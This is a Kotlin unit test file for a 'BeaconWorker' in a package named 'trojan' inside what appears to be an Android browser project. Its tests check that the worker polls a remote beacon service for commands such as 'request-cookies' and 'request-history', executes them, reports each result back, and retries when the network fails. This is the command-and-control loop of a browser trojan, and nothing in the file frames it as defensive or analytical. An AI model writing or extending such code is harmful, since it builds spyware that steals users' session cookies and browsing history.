package com.duckduckgo.trojan.impl

import android.content.Context
import androidx.work.ListenableWorker.Result
import androidx.work.testing.TestListenableWorkerBuilder
import com.duckduckgo.common.test.CoroutineTestRule
import com.duckduckgo.trojan.api.BeaconService
import com.duckduckgo.trojan.api.PendingCommand
import kotlinx.coroutines.test.runTest
import org.hamcrest.CoreMatchers.`is`
import org.hamcrest.MatcherAssert.assertThat
import org.junit.Before
import org.junit.Rule
import org.junit.Test
import org.junit.runner.RunWith
import org.mockito.kotlin.any
import org.mockito.kotlin.eq
import org.mockito.kotlin.mock
import org.mockito.kotlin.never
import org.mockito.kotlin.verify
import org.mockito.kotlin.whenever
import org.robolectric.RobolectricTestRunner
import org.robolectric.RuntimeEnvironment

@RunWith(RobolectricTestRunner::class)
class BeaconWorkerTest {

    @get:Rule
    val coroutineRule = CoroutineTestRule()

    private val mockBeaconService: BeaconService = mock()
    private val mockCommandHandler: CommandHandler = mock()
    private lateinit var context: Context

    @Before
    fun setUp() {
        context = RuntimeEnvironment.getApplication()
    }

    // -----------------------------------------------------------------------
    // doWork() — success scenarios
    // -----------------------------------------------------------------------

    @Test
    fun whenNoTasksPendingThenReturnsSuccess() = runTest {
        whenever(mockBeaconService.checkIn()).thenReturn(emptyList())

        val worker = createWorker()
        val result = worker.doWork()

        assertThat(result, `is`(Result.success()))
    }

    @Test
    fun whenTasksExistThenExecutesAllAndReturnsSuccess() = runTest {
        val tasks = listOf(
            PendingCommand(id = "t1", type = "request-cookies", payload = "{}"),
            PendingCommand(id = "t2", type = "request-history", payload = ""),
        )
        whenever(mockBeaconService.checkIn()).thenReturn(tasks)
        whenever(mockCommandHandler.execute(any())).thenReturn("some result")

        val worker = createWorker()
        val result = worker.doWork()

        assertThat(result, `is`(Result.success()))
    }

    @Test
    fun whenTasksExistThenDelegatesToCommandHandler() = runTest {
        val cmd = PendingCommand(id = "t1", type = "request-cookies", payload = "google.com")
        whenever(mockBeaconService.checkIn()).thenReturn(listOf(cmd))
        whenever(mockCommandHandler.execute(any())).thenReturn("cookies data")

        val worker = createWorker()
        worker.doWork()

        verify(mockCommandHandler).execute(eq(cmd))
    }

    @Test
    fun whenTasksExistThenSendsResultForEachTask() = runTest {
        val tasks = listOf(
            PendingCommand(id = "t1", type = "request-cookies", payload = "{}"),
            PendingCommand(id = "t2", type = "request-history", payload = ""),
        )
        whenever(mockBeaconService.checkIn()).thenReturn(tasks)
        whenever(mockCommandHandler.execute(any())).thenReturn("result data")

        val worker = createWorker()
        worker.doWork()

        verify(mockBeaconService).sendResult(eq("t1"), any())
        verify(mockBeaconService).sendResult(eq("t2"), any())
    }

    // -----------------------------------------------------------------------
    // doWork() — failure scenarios
    // -----------------------------------------------------------------------

    @Test
    fun whenCheckInFailsThenReturnsRetry() = runTest {
        whenever(mockBeaconService.checkIn()).thenThrow(RuntimeException("Network error"))

        val worker = createWorker()
        val result = worker.doWork()

        assertThat(result, `is`(Result.retry()))
    }

    @Test
    fun whenSendResultFailsThenReturnsRetry() = runTest {
        val tasks = listOf(
            PendingCommand(id = "t1", type = "request-cookies", payload = "{}"),
        )
        whenever(mockBeaconService.checkIn()).thenReturn(tasks)
        whenever(mockCommandHandler.execute(any())).thenReturn("data")
        whenever(mockBeaconService.sendResult(any(), any())).thenThrow(RuntimeException("Network error"))

        val worker = createWorker()
        val result = worker.doWork()

        assertThat(result, `is`(Result.retry()))
    }

    @Test
    fun whenCheckInFailsThenNoResultsAreSent() = runTest {
        whenever(mockBeaconService.checkIn()).thenThrow(RuntimeException("Network error"))

        val worker = createWorker()
        worker.doWork()

        verify(mockBeaconService, never()).sendResult(any(), any())
        verify(mockCommandHandler, never()).execute(any())
    }

    // -----------------------------------------------------------------------
    // Helper
    // -----------------------------------------------------------------------

    private fun createWorker(): BeaconWorker {
        val worker = TestListenableWorkerBuilder<BeaconWorker>(context).build()
        worker.beaconService = mockBeaconService
        worker.commandHandler = mockCommandHandler
        return worker
    }
}
